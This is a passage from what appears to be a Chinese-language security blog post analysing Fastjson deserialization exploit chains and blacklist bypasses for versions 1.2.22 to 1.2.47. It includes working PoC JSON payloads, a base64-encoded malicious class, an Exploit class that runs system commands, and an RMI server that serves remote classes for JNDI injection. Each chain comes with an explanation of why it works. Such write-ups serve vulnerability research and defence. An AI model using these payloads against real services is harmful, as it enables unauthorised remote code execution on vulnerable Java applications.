&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="为什么恶意类需要继承AbstractTranslet类"><a href="#为什么恶意类需要继承AbstractTranslet类" class="headerlink" title="为什么恶意类需要继承AbstractTranslet类"></a>为什么恶意类需要继承AbstractTranslet类</h4><p><font style="color:rgb(32, 32, 32);">getOutputProperties–&gt;newTransformer–&gt;getTransletInstance()–&gt;</font>defineTransletClasses()有个逻辑会判断恶意类的父类类名是否是ABSTRACT_TRANSLET，是的话_transletIndex变量的值被设置为0，到后面的if判断语句中就不会被识别为&lt;0而抛出异常终止程序。</p>
<h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="string">&quot;_bytecodes&quot;</span>:[<span class="string">&quot;yv66vgAAADMANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHAC8MADAAMQEABGNhbGMMADIAMwEABFRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACgAEAAsADQAMAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAADwAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAEgAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAUAAgAFQAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA==&quot;</span>],<span class="string">&#x27;_name&#x27;</span>:<span class="string">&#x27;a.b&#x27;</span>,<span class="string">&#x27;_tfactory&#x27;</span>:&#123; &#125;,<span class="string">&quot;_outputProperties&quot;</span>:&#123; &#125;,<span class="string">&quot;_name&quot;</span>:<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_version&quot;</span>:<span class="string">&quot;1.0&quot;</span>,<span class="string">&quot;allowedProtocols&quot;</span>:<span class="string">&quot;all&quot;</span>&#125;</span><br></pre></td></tr></table></figure>



<p>PoC中几个重要的Json键的含义：</p>
<p>@type——指定的解析类，即com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在PoC中，_bytecodes和_name都是私有属性，所以想要反序列化这两个属性，需要在parseObject()时设置Feature.SupportNonPublicField；</p>
<p>_bytecodes——是我们把恶意类的.class文件二进制格式进行Base64编码后得到的字符串；</p>
<p>_outputProperties——漏洞利用链的关键会调用其参数的getOutputProperties()方法，进而导致命令执行；</p>
<p>_tfactory:{}——在defineTransletClasses()时会调用getExternalExtensionsMap()，当为null时会报错，所以要对_tfactory设置；</p>
<p>漏洞代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(poctext, Object.class, <span class="keyword">new</span> <span class="title class_">ParserConfig</span>(), Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure>

<h4 id="为什么需要对-bytecodes进行Base64编码"><a href="#为什么需要对-bytecodes进行Base64编码" class="headerlink" title="为什么需要对_bytecodes进行Base64编码"></a>为什么需要对_bytecodes进行Base64编码</h4><p>可以发现，在PoC中的_bytecodes字段是经过Base64编码的。为什么要怎么做呢？分析Fastjson对JSON字符串的解析过程，原理Fastjson提取byte[]数组字段值时会进行Base64解码，所以我们构造payload时需要对_bytecodes字段进行Base64加密处理。</p>
<h4 id="为什么需要设置-tfactory为"><a href="#为什么需要设置-tfactory为" class="headerlink" title="为什么需要设置_tfactory为{}"></a>为什么需要设置_tfactory为{}</h4><p>在getTransletInstance()函数中调用了defineTransletClasses()函数，defineTransletClasses()函数是用于生成Java类的，在其中会新建一个转换类加载器，其中会调用到_tfactory.getExternalExtensionsMap()方法，若_tfactory为null则会导致这段代码报错、从而无法生成恶意类</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>其实就是fastjson在反序列化时会调用TemplatesImpl的getOutputProperties()方法，从而加载到恶意类的Base64编码的字节数组。</p>
<h2 id="基于JdbcRowSetImpl的利用链"><a href="#基于JdbcRowSetImpl的利用链" class="headerlink" title="基于JdbcRowSetImpl的利用链"></a>基于JdbcRowSetImpl的利用链</h2><h3 id="限制-1"><a href="#限制-1" class="headerlink" title="限制"></a>限制</h3><p>基于JdbcRowSetImpl的利用链主要有两种利用方式，即JNDI+RMI和JNDI+LDAP，都是属于基于Bean Property类型的JNDI的利用方式。</p>
<p>由于是利用JNDI注入漏洞来触发的，因此主要的限制因素是JDK版本。</p>
<p>基于RMI利用的JDK版本&lt;&#x3D;6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;&#x3D;6u211、7u201、8u191。</p>
<p>需要出网。</p>
<h3 id="JNDI-RMI复现利用"><a href="#JNDI-RMI复现利用" class="headerlink" title="JNDI+RMI复现利用"></a>JNDI+RMI复现利用</h3><p>PoC如下，@type指向com.sun.rowset.JdbcRowSetImpl类，dataSourceName值为RMI服务中心绑定的Exploit服务，autoCommit有且必须为true或false等布尔值类型：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://localhost:1099/Exploit&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>



<p>JNDIServer.java，RMI服务，注册表绑定了Exploit服务，该服务是指向恶意Exploit.class文件所在服务器的Reference</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//http://127.0.0.1:8000/Exploit.class即可</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Exloit&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Exploit.java，恶意类，单独编译成class文件并放置于RMI服务指向的三方Web服务中，作为一个Factory绑定在注册表服务中：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] cmds = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)</span><br><span class="line">                    ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;calc.exe&quot;</span>&#125;</span><br><span class="line">                    : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;touch /tmp/hacked&quot;</span>&#125;;</span><br><span class="line">            Runtime.getRuntime().exec(cmds);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Exploit</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exploit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>漏洞代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先运行JNDI的RMI服务，将恶意类Exploit.class单独放置于一个三方的Web服务中，然后运行PoC即可弹计算器，且看到访问了含有恶意类的Web服务。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732696623586-35f05d8e-6341-4fa7-82c2-0ecaf60317e8.png"></p>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>在<strong>JdbcRowSetImpl</strong>中的setDataSourceName()和setAutoCommit()函数都会被调用，setDataSourceName()函数，将dataSourceName值设置为目标RMI服务的地址，</p>
<p>setAutoCommit()函数，设置autoCommit值，其中调用了connect()函数。</p>
<p>跟进connect()函数，看到了熟悉的JNDI注入的代码即<strong>InitialContext.lookup()</strong>，并且其参数是调用this.getDataSourceName()获取的、即在前面setDataSourceName()函数中设置的值，因此lookup参数外部可控，导致存在JNDI注入漏洞。</p>
<h2 id="BasicDataSource-BCEL-ClassLoader"><a href="#BasicDataSource-BCEL-ClassLoader" class="headerlink" title="BasicDataSource+BCEL ClassLoader"></a>BasicDataSource+BCEL ClassLoader</h2><h3 id="限制-2"><a href="#限制-2" class="headerlink" title="限制"></a>限制</h3><p><font style="color:rgba(34, 34, 34, 0.8);">依赖包 tomcat-dbcp 使用也比较广泛，是Tomcat的数据库驱动组件</font></p>
<p>直接传入字节码不需要出网就可执行恶意代码但是需要引入tomcat的依赖</p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 目标是 JSON.parse()</span></span><br><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">                <span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: <span class="string">&quot;x&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标是JSON.parseObject()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">        <span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b......&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>driverClassName里面传入的其实是恶意类经过BCEL协议编码过后的代码。</p>
<h3 id="BasicDataSource"><a href="#BasicDataSource" class="headerlink" title="BasicDataSource"></a>BasicDataSource</h3><p>BasicDataSource的toString()方法会遍历这个类的所有getter并执行，于是通过getConnection()-&gt;createDataSource()-&gt;createConnectionFactory()的调用关系，调用到了createConnectionFactory方法。</p>
<p>在createConnectionFactory方法中，调用了Class.forName(driverClassName, true, driverClassLoader)。Class.forName第二个参数initial为true时，类加载后将会直接执行static{}块中的代码。</p>
<p>因为driverClassLoader和driverClassName都可以通过fastjson控制，所以只要找到一个可以利用的恶意类即可。</p>
<p>BCEL ClassLoader闪亮登场。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1735638660961-a4b3956d-fa49-4985-bdbf-6c7b72d0f930.png"></p>
<h3 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h3><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为</p>
<p>被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的</p>
<p>原生库中。</p>
<p>com.sun.org.apache.bcel.internal.util.ClassLoader;</p>
<p>BCEL ClassLoader用于加载BCEL和格式的“字节码”，并可以执行其中的代码。</p>
<p>这是一个神奇的 ClassLoader，因为它会直接从 classname 中提取 Class 的 bytecode 数据。</p>
<p>如果 classname 中包含 $$BCEL$$ ，这个 ClassLoader 则会将$$BCEL$$后面的字符串按照BCEL编码进行解码，作为Class的字节码，并调用 defineClass() 获取 Class 对象。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1735638985993-3724ab80-0b6b-44c4-92c3-c452eebef26a.png"></p>
<p>BCEL ClassLoader在Fastjson等漏洞的利用链构造时都有被用到，其实这个类和前面的</p>
<p>TemplatesImpl都出自于同一个第三方库，Apache Xalan。但是由于各种原因（详见前面所说的</p>
<p>《BCEL ClassLoader去哪了》），在Java 8u251的更新中，这个ClassLoader被移除了。</p>
<h3 id="JSONObject触发toString"><a href="#JSONObject触发toString" class="headerlink" title="JSONObject触发toString()"></a>JSONObject触发toString()</h3><p>首先，在 {“@type”: “org.apache.tomcat.dbcp.dbcp2.BasicDataSource”……} 这一整段外面再套一层{}，反序列化生成一个 JSONObject 对象。</p>
<p>然后，将这个 JSONObject 放在 JSON Key 的位置上，在 JSON 反序列化的时候，FastJson 会对 JSON Key 自动调用 toString() 方法。</p>
<p>当然，如果目标环境的开发者代码中是调用的是 JSON.parseObject() ，那就不用这么麻烦了。与 parse() 相比，parseObject() 会额外的将 Java 对象转为 JSONObject 对象，即调用 JSON.toJSON()，在处理过程中会调用所有的 setter 和 getter 方法。</p>
<p>所以对于 JSON.parseObject()，不用外面多包一层。</p>
<h1 id="版本差异"><a href="#版本差异" class="headerlink" title="版本差异"></a>版本差异</h1><h2 id="1-2-22-1-2-24"><a href="#1-2-22-1-2-24" class="headerlink" title="1.2.22-1.2.24"></a>1.2.22-1.2.24</h2><h3 id="JdbcRowSetImpl-Poc"><a href="#JdbcRowSetImpl-Poc" class="headerlink" title="JdbcRowSetImpl Poc"></a>JdbcRowSetImpl Poc</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&#123;&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>将DefaultJSONParser.parseObject()函数中的TypeUtils.loadClass替换为checkAutoType()函数</p>
<p>checkAutoType()函数就是使用黑白名单的方式对反序列化的类型继续过滤，acceptList为白名单（默认为空，可手动添加），denyList为黑名单（默认不为空）。</p>
<p>autoTypeSupport为False，不支持自动类型转换，只能加载白名单上的类。</p>
<p>autoTypeSupport为True，支持自动类型转换，只要不在黑名单上都能被加载。</p>
<p>默认情况下autoTypeSupport为false。</p>
<h2 id="1-2-25-1-2-41绕过"><a href="#1-2-25-1-2-41绕过" class="headerlink" title="1.2.25-1.2.41绕过"></a>1.2.25-1.2.41绕过</h2><p>在1.2.24之后的版本中，使用了checkAutoType()函数，通过黑白名单的方式来防御Fastjson反序列化漏洞，因此后面发现的Fastjson反序列化漏洞都是针对黑名单的绕过来实现攻击利用的。</p>
<p>本篇文章讲的历史补丁版本绕过的利用，都必须开启AutoTypeSupport才能成功。</p>
<h4 id="JdbcRowSetImpl-Poc-1"><a href="#JdbcRowSetImpl-Poc-1" class="headerlink" title="JdbcRowSetImpl Poc"></a>JdbcRowSetImpl Poc</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>



<h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>类名的前面加”L”、后面加了”;”</p>
<h4 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h4><p>checkAutoType()函数中，”Lcom.sun.rowset.JdbcRowSetImpl;”类名由于是以”L”开头，因此并不在denyList黑名单中，从而绕过了黑名单校验，再往下开始调用TypeUtils.loadClass()。</p>
<p>TypeUtils.loadClass()函数，这里我们在之前的文章中年已经调试分析过了，，就是会有个判断条件判断类名是否以”L”开头、以”;”结尾，是的话就提取出其中的类名再加载进来，因此能成功绕过</p>
<h2 id="1-2-25-1-2-42绕过"><a href="#1-2-25-1-2-42绕过" class="headerlink" title="1.2.25-1.2.42绕过"></a>1.2.25-1.2.42绕过</h2><p>在1.2.41中L;的方法测试可以，1.2.42中不行。</p>
<h4 id="哈希黑名单"><a href="#哈希黑名单" class="headerlink" title="哈希黑名单"></a>哈希黑名单</h4><p>从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
<h4 id="1-2-25-1-2-41的修复"><a href="#1-2-25-1-2-41的修复" class="headerlink" title="1.2.25-1.2.41的修复"></a>1.2.25-1.2.41的修复</h4><p>checkAutoType()函数中，会对”L”开头和”;”结尾的类名进行一次提取操作。</p>
<h4 id="JdbcRowSetImpl-Poc-2"><a href="#JdbcRowSetImpl-Poc-2" class="headerlink" title="JdbcRowSetImpl Poc"></a>JdbcRowSetImpl Poc</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>类名的前面加了”LL”、后面加了”;;”</p>
<h4 id="原因：-1"><a href="#原因：-1" class="headerlink" title="原因："></a>原因：</h4><p>后面调用TypeUtils.loadClass()函数时，传入的是我们输入的LLcom.sun.rowset.JdbcRowSetImpl;;</p>
<p>为何添加了两次的类名也能成功触发呢？我们跟进TypeUtils.loadClass()函数中可以发现，在”L”和”;”之间提取出类名后，会再次调用自身函数loadClass()，也就是说只要检测出”L”开头和”;”结尾的字符都会调用自身来循环提取出真正的类名。</p>
<h2 id="1-2-25-1-2-45绕过"><a href="#1-2-25-1-2-45绕过" class="headerlink" title="1.2.25-1.2.45绕过"></a>1.2.25-1.2.45绕过</h2><p>绕过利用</p>
<p>前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</p>
<p>直接给出payload，要连LDAP或RMI都可以：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<span class="string">&quot;properties&quot;</span>:&#123;<span class="string">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>主要就是黑名单绕过，这个类我们在哈希黑名单中1.2.46的版本中才被加入黑名单。</p>
<h4 id="JndiDataSourceFactory"><a href="#JndiDataSourceFactory" class="headerlink" title="JndiDataSourceFactory"></a>JndiDataSourceFactory</h4><p>利用的是JndiDataSourceFactory.setProperties()方法，这个方法中调用了InitialContext.lookup()，存在JNDI注入。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732707881065-262905f6-a821-4fb7-850b-774f5c71f2df.png"></p>
<h2 id="1-2-25-1-2-47绕过"><a href="#1-2-25-1-2-47绕过" class="headerlink" title="1.2.25-1.2.47绕过"></a>1.2.25-1.2.47绕过</h2><p>无需开启AutoType</p>
<h3 id="限制-3"><a href="#限制-3" class="headerlink" title="限制"></a>限制</h3><p>主要是JDK版本对于JDNI注入的限制，基于RMI利用的JDK版本&lt;&#x3D;6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;&#x3D;6u211、7u201、8u191。</p>
<h3 id="Poc-1"><a href="#Poc-1" class="headerlink" title="Poc"></a>Poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际上还是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来攻击利用的，因此除了JDK版本外几乎没有限制。</p>
<p>但是如果目标服务端开启了AutoTypeSupport呢？经测试发现：</p>
<p>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</p>
<p>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</p>
<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>在TypeUtils的static初始化时调用com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings中会将常用的类通过loadclass()放入mapping中。</p>
<p>在第一次扫描解析中，由于@type执行java.lang.Class类，该类在接下来的deserializers.findClass()函数中直接被找到，判断clazz是否为Class类，是的话调用TypeUtils.loadClass()在TypeUtils.loadClass()函数中，成功加载com.sun.rowset.JdbcRowSetImpl类后，就会将其缓存在Map中。</p>
